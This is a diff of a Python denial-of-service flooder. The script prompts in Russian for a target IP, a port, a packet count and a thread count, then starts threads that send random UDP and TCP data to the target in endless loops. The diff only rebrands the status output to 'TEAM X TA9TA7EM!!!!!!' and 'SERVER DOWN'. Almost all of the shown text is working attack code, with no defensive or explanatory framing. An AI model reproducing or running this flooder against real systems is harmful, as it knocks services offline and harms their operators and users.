@@ -29,7 +29,7 @@ if platform.system() == 'Linux':
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 
 	""")
-
+	
 print("")
 ip= str(input("                      Введите айпи адрес: "))
 port= int(input("                      Введите порт: "))
@@ -37,20 +37,20 @@ times= int(input("                      Введите количество за
 threads= int(input("                      Введите количество потоков: "))
 def run():
 	data = random._urandom(1024)
-	i = random.choice((" "))
+	i = random.choice(("[-]","[•]","[×]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" ")
+			print(i +"TEAM X TA9TA7EM!!!!!!")
 		except:
-			print("Сервер не отвечает")
+			print("[!] SERVER DOWN!!!")
 
 def run2():
 	data = random._urandom(16)
-	i = random.choice((" "))
+	i = random.choice(("[-]","[+]","[x]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -58,14 +58,14 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" ")
+			print(i +"TEAM X TA9TA7EM!!!!!!")
 		except:
 			s.close()
-			print("Сервер не отвечает")
+			print("[*] SERVER DOWN")
 
 for y in range(threads):
 		th = threading.Thread(target = run)
 		th.start()
-
+		
 		th = threading.Thread(target = run2)
 		th.start()
